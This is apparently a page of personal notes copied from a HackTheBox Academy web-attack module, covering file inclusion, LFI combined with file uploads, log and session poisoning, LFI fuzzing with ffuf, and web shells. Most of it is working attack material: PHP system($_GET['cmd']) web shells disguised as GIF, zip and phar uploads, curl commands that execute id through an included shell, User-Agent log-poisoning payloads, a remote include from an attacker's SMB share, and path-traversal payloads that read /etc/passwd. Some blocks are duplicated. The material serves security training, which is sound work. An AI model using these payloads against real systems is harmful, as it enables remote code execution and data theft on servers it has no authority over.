</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-aa9e5fc6928da825cb5601015f0382a2 class=lightbox-link><img alt=1f2e8e11b4e2f16dfa46f71d01aad3e7.png class="lazy lightbox figure-image" loading=lazy src=../../resources/1f2e8e11b4e2f16dfa46f71d01aad3e7.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-aa9e5fc6928da825cb5601015f0382a2><img alt=1f2e8e11b4e2f16dfa46f71d01aad3e7.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/1f2e8e11b4e2f16dfa46f71d01aad3e7.png></a></p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ curl &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id&#39;
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h2 id=smb>SMB</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ impacket-smbserver -smb2support share $(pwd)
</span></span><span style=display:flex><span>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style=display:flex><span>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span></code></pre></div><p>Now, we can include our script by using a UNC path (e.g. <code>\\&lt;OUR_IP>\share\shell.php</code>), and specify the command with (<code>&amp;cmd=whoami</code>) as we did earlier:</p><p><a href=#R-image-02cf523ce0af38755bb766bfda01aa81 class=lightbox-link><img alt="Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed." class="lazy lightbox figure-image" loading=lazy src=../../resources/windows_rfi.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-02cf523ce0af38755bb766bfda01aa81><img alt="Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/windows_rfi.png></a></p><p>As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is <code>more likely to work if we were on the same network</code>, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ impacket-smbserver -smb2support share $(pwd)
</span></span><span style=display:flex><span>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
</span></span><span style=display:flex><span>[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span><span style=display:flex><span>[*] Config file parsed
</span></span></code></pre></div><p>Now, we can include our script by using a UNC path (e.g. <code>\\&lt;OUR_IP>\share\shell.php</code>), and specify the command with (<code>&amp;cmd=whoami</code>) as we did earlier:</p><p><a href=#R-image-0f5911e40475228668e66af3ce4cccb2 class=lightbox-link><img alt="Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed." class="lazy lightbox figure-image" loading=lazy src=https://academy.hackthebox.com/storage/modules/23/windows_rfi.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-0f5911e40475228668e66af3ce4cccb2><img alt="Shipping containers and cranes at a port with NT AUTHORITYUSR information displayed." class="lazy lightbox lightbox-image" loading=lazy src=https://academy.hackthebox.com/storage/modules/23/windows_rfi.png></a></p><p>As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is <code>more likely to work if we were on the same network</code>, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.</p><p>¬†</p><p>¬†</p><h1 id=lfi-and-file-uploads>LFI and File Uploads</h1><p>¬†</p><h4 id=crafting-malicious-image>Crafting Malicious Image</h4><p>Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. <code>shell.gif</code>), and should also include the image magic bytes at the beginning of the file content (e.g. <code>GIF8</code>), just in case the upload form checks for both the extension and content type as well. We can do so as follows:</p><p>LFI and File Uploads</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;GIF8&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.gif
</span></span></code></pre></div><p>¬†</p><p>¬†</p><h4 id=uploaded-file-path>Uploaded File Path</h4><p>Once we&rsquo;ve uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:</p><p>Code: html</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>img</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/profile_images/shell.gif&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;profile-image&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;profile-image&#34;</span>&gt;</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-f0d0263cca03c72438b2b492aa075a49 class=lightbox-link><img alt=730574263c4c6984b0e1910d4ccb2ec5.png class="lazy lightbox figure-image" loading=lazy src=../../resources/730574263c4c6984b0e1910d4ccb2ec5.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-f0d0263cca03c72438b2b492aa075a49><img alt=730574263c4c6984b0e1910d4ccb2ec5.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/730574263c4c6984b0e1910d4ccb2ec5.png></a></p><p>¬†</p><p>¬†</p><h2 id=zip-upload>Zip Upload</h2><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php
</span></span></code></pre></div><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.php &amp;&amp; zip shell.jpg shell.php
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-305bf4d848e92ff90e85c10de0d35380 class=lightbox-link><img alt=6110606e6fa0b484c817a12685768e82.png class="lazy lightbox figure-image" loading=lazy src=../../resources/6110606e6fa0b484c817a12685768e82.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-305bf4d848e92ff90e85c10de0d35380><img alt=6110606e6fa0b484c817a12685768e82.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/6110606e6fa0b484c817a12685768e82.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=phar-upload>Phar Upload</h2><p>Finally, we can use the <code>phar://</code> wrapper to achieve a similar result. To do so, we will first write the following PHP script into a <code>shell.php</code> file:</p><p>Code: php</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$phar <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#39;shell.phar&#39;</span>);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#39;shell.txt&#39;</span>, <span style=color:#e6db74>&#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span>);
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();</span></span></code></pre></div><p>This script can be compiled into a <code>phar</code> file that when called would write a web shell to a <code>shell.txt</code> sub-file, which we can interact with. We can compile it into a <code>phar</code> file and rename it to <code>shell.jpg</code> as follows:</p><p>LFI and File Uploads</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg
</span></span></code></pre></div><p>Now, we should have a phar file called <code>shell.jpg</code>. Once we upload it to the web application, we can simply call it with <code>phar://</code> and provide its URL path, and then specify the phar sub-file with <code>/shell.txt</code> (URL encoded) to get the output of the command we specify with (<code>&amp;cmd=id</code>), as follows:</p><p><a href=#R-image-5f96f2730a7ad1fe205f49f2425df851 class=lightbox-link><img alt="Shipping containers and cranes at a port with user data information displayed." class="lazy lightbox figure-image" loading=lazy src=../../resources/rfi_localhost.jpg style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-5f96f2730a7ad1fe205f49f2425df851><img alt="Shipping containers and cranes at a port with user data information displayed." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/rfi_localhost.jpg></a></p><p>As we can see, the <code>id</code> command was successfully executed. Both the <code>zip</code> and <code>phar</code> wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.</p><p><strong>Note:</strong> There is another (obsolete) LFI/uploads attack worth noting, which occurs if file uploads is enabled in the PHP configurations and the <code>phpinfo()</code> page is somehow exposed to us. However, this attack is not very common, as it has very specific requirements for it to work (LFI + uploads enabled + old PHP + exposed phpinfo()). If you are interested in knowing more about it, you can refer to <a href=https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo rel=external>This Link</a>.</p><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=log-poisoning>Log Poisoning</h1><h2 id=php-session-poisoning>PHP Session Poisoning</h2><p>Most PHP web applications utilize <code>PHPSESSID</code> cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in <code>session</code> files on the back-end, and saved in <code>/var/lib/php/sessions/</code> on Linux and in <code>C:\Windows\Temp\</code> on Windows. The name of the file that contains our user&rsquo;s data matches the name of our <code>PHPSESSID</code> cookie with the <code>sess_</code> prefix. For example, if the <code>PHPSESSID</code> cookie is set to <code>el4ukv0kqbvoirg7nkp4dncpk3</code>, then its location on disk would be <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code>.</p><p>¬†</p><p>¬†</p><p><a href=#R-image-322fd3b01d1a0545284c0b3b6f7fcc15 class=lightbox-link><img alt=44a145a9381a992d4915d7fefadd78bd.png class="lazy lightbox figure-image" loading=lazy src=../../resources/44a145a9381a992d4915d7fefadd78bd.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-322fd3b01d1a0545284c0b3b6f7fcc15><img alt=44a145a9381a992d4915d7fefadd78bd.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/44a145a9381a992d4915d7fefadd78bd.png></a></p><p>¬†</p><p>¬†http://&lt;SERVER_IP>:&lt;PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd<a href=#R-image-6f673ce06c8fcc1f89966e4b25753f88 class=lightbox-link><img alt=6c6cc535d44b894bb22b1f3e093f2cde.png class="lazy lightbox figure-image" loading=lazy src=../../resources/6c6cc535d44b894bb22b1f3e093f2cde.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-6f673ce06c8fcc1f89966e4b25753f88><img alt=6c6cc535d44b894bb22b1f3e093f2cde.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/6c6cc535d44b894bb22b1f3e093f2cde.png></a></p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-url data-lang=url>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></pre></div><p>Finally, we can include the session file and use the <code>&amp;cmd=id</code> to execute a commands:</p><p><a href=#R-image-aa7c9bbb89776e1b0117e5096f53ed6a class=lightbox-link><img alt="Shipping containers and cranes at a port with PHP notice about an undefined variable." class="lazy lightbox figure-image" loading=lazy src=../../resources/rfi_session_id.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-aa7c9bbb89776e1b0117e5096f53ed6a><img alt="Shipping containers and cranes at a port with PHP notice about an undefined variable." class="lazy lightbox lightbox-image" loading=lazy src=../../resources/rfi_session_id.png></a></p><p>¬†</p><p>¬†</p><p>¬†</p><h2 id=server-log-poisoning>Server Log Poisoning</h2><p>Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. <code>Nginx</code> logs are readable by low privileged users by default (e.g. <code>www-data</code>), while the <code>Apache</code> logs are only readable by users with high privileges (e.g. <code>root</code>/<code>adm</code> groups). However, in older or misconfigured <code>Apache</code> servers, these logs may be readable by low-privileged users.</p><p>¬†</p><p>By default, <code>Apache</code> logs are located in <code>/var/log/apache2/</code> on Linux and in <code>C:\xampp\apache\logs\</code> on Windows, while <code>Nginx</code> logs are located in <code>/var/log/nginx/</code> on Linux and in <code>C:\nginx\log\</code> on Windows. However, the logs may be in a different location in some cases, so we may use an <a href=https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI rel=external>LFI Wordlist</a> to fuzz for their locations, as will be discussed in the next section.</p><p>¬†</p><p>¬†</p><p>So, let&rsquo;s try including the Apache access log from <code>/var/log/apache2/access.log</code>, and see what we get:</p><p>¬†</p><p><a href=#R-image-dff30003b600b2cba7588e82592a921c class=lightbox-link><img alt=143998a0390b74e62ed5bb56e7437083.png class="lazy lightbox figure-image" loading=lazy src=../../resources/143998a0390b74e62ed5bb56e7437083.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-dff30003b600b2cba7588e82592a921c><img alt=143998a0390b74e62ed5bb56e7437083.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/143998a0390b74e62ed5bb56e7437083.png></a></p><p>¬†</p><p>¬†</p><p>To do so, we will use <code>Burp Suite</code> to intercept our earlier LFI request and modify the <code>User-Agent</code> header to <code>Apache Log Poisoning</code>:</p><p>¬†</p><p><a href=#R-image-9a30bc747fb37609ef9cd6b11b66d5b3 class=lightbox-link><img alt=dfa06b31e56589ac873e8e75f4c746aa.png class="lazy lightbox figure-image" loading=lazy src=../../resources/dfa06b31e56589ac873e8e75f4c746aa.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-9a30bc747fb37609ef9cd6b11b66d5b3><img alt=dfa06b31e56589ac873e8e75f4c746aa.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/dfa06b31e56589ac873e8e75f4c746aa.png></a></p><p>¬†</p><p>¬†</p><p>We may also poison the log by sending a request through cURL, as follows:</p><p>Log Poisoning</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ echo -n &#34;User-Agent: &lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&#34; &gt; Poison
</span></span><span style=display:flex><span>cube111@local[/local]$ curl -s &#34;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php&#34; -H @Poison
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p><a href=#R-image-b49202127191ca3245b204c33ee5c262 class=lightbox-link><img alt=57ebbe605a7c82d20cb76e5efbd5c74c.png class="lazy lightbox figure-image" loading=lazy src=../../resources/57ebbe605a7c82d20cb76e5efbd5c74c.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-b49202127191ca3245b204c33ee5c262><img alt=57ebbe605a7c82d20cb76e5efbd5c74c.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/57ebbe605a7c82d20cb76e5efbd5c74c.png></a></p><p><a href=#R-image-4e83cbd6081033b6293d4a2e48281604 class=lightbox-link><img alt=cf96b213118b750c863639af1c52ea07.png class="lazy lightbox figure-image" loading=lazy src=../../resources/cf96b213118b750c863639af1c52ea07.png style=height:auto;width:auto></a>
<a href=javascript:history.back(); class=lightbox-back id=R-image-4e83cbd6081033b6293d4a2e48281604><img alt=cf96b213118b750c863639af1c52ea07.png class="lazy lightbox lightbox-image" loading=lazy src=../../resources/cf96b213118b750c863639af1c52ea07.png></a></p><p>¬†</p><p><strong>Tip:</strong> The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, we can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code> files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p><p>¬†</p><p>¬†</p><p>¬†</p><ul><li><code>/var/log/sshd.log</code></li><li><code>/var/log/mail</code></li><li><code>/var/log/vsftpd.log</code></li></ul><h1 id=automated-scanning>Automated Scanning</h1><h2 id=fuzzing-parameters>Fuzzing Parameters</h2><p>¬†https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value&#39; -fs 2287
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span> :: Filter           : Response size: xxx
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
</span></span></code></pre></div><p>¬†</p><p>There are a number of <a href=https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI rel=external>LFI Wordlists</a> we can use for this scan. A good wordlist is <a href=https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt rel=external>LFI-Jhaddix.txt</a>, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the <code>?language=</code> parameter we have been testing throughout the module, as follows:</p><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ&#39; -fs 2287
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=key
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403
</span></span><span style=display:flex><span> :: Filter           : Response size: xxx
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
</span></span><span style=display:flex><span>../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
</span></span><span style=display:flex><span>../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
</span></span><span style=display:flex><span>../../../../../../etc/passwd&amp;=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
</span></span><span style=display:flex><span>..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
</span></span><span style=display:flex><span>/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><p>¬†</p><h4 id=server-webroot>Server Webroot</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php&#39; -fs 2287
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style=display:flex><span> :: Filter           : Response size: 2287
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/var/www/html/          [Status: 200, Size: 0, Words: 1, Lines: 1]
</span></span></code></pre></div><p>¬†</p><p>¬†</p><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>cube111@local[/local]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u &#39;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ&#39; -fs 2287
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>...SNIP...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: ./LFI-WordList-Linux
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : 10
</span></span><span style=display:flex><span> :: Threads          : 40
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style=display:flex><span> :: Filter           : Response size: 2287
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>/etc/hosts              [Status: 200, Size: 2461, Words: 636, Lines: 72]
</span></span><span style=display:flex><span>/etc/hostname           [Status: 200, Size: 2300, Words: 634, Lines: 66]
</span></span><span style=display:flex><span>/etc/login.defs         [Status: 200, Size: 12837, Words: 2271, Lines: 406]
</span></span><span style=display:flex><span>/etc/fstab              [Status: 200, Size: 2324, Words: 639, Lines: 66]
</span></span><span style=display:flex><span>/etc/apache2/apache2.conf [Status: 200, Size: 9511, Words: 1575, Lines: 292]
</span></span><span style=display:flex><span>/etc/issue.net          [Status: 200, Size: 2306, Words: 636, Lines: 66]
</span></span><span style=display:flex><span>...SNIP...
</span></span><span style=display:flex><span>/etc/apache2/mods-enabled/status.conf [Status: 200, Size: 3036, Words: 715, Lines: 94]
</span></span><span style=display:flex><span>/etc/apache2/mods-enabled/alias.conf [Status: 200, Size: 3130, Words: 748, Lines: 89]
</span></span><span style=display:flex><span>/etc/apache2/envvars    [Status: 200, Size: 4069, Words: 823, Lines: 112]
</span></span><span style=display:flex><span>/etc/adduser.conf       [Status: 200, Size: 5315, Words: 1035, Lines: 153]
</span></span></code></pre></div><p>¬†</p><p>¬†</p><p>¬†</p><h1 id=file-upload-attacks>File Upload Attacks</h1><h1 id=absent-validation>Absent Validation</h1><p>¬†</p><p>We can download any of these web shells for the language of our web application (<code>PHP</code> in our case), then upload it through the vulnerable upload feature, and visit the uploaded file to interact with the web shell. For example, let&rsquo;s try to upload <code>phpbash.php</code> from <a href=https://github.com/Arrexel/phpbash rel=external>phpbash</a> to our web application, and then navigate to its link by clicking on the Download button:</p><h2 id=web-shells>Web Shells</h2><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>system</span>($_REQUEST[<span style=color:#e6db74>&#39;cmd&#39;</span>]); <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
